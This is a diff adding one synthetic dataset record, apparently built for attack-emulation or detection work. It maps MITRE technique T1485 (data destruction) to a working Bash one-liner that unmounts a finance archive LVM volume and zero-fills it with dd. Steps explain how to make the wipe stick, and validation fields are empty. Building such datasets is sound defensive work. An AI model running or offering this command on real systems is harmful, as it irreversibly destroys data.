@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'lv=/dev/vg_finance/lv_archive; umount \"$lv\" 2>/dev/null || true; dd if=/dev/zero of=\"$lv\" bs=4M oflag=direct status=progress'",
+  "explanation": "Targets a specific LVM logical volume and overwrites it with zeros, destroying all contained data.",
+  "rationale_steps": [
+    "Select the dedicated logical volume",
+    "Unmount to avoid active filesystem writes",
+    "Overwrite the entire volume with zeros",
+    "Bypass cache to ensure on-disk destruction"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-b05d0366",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
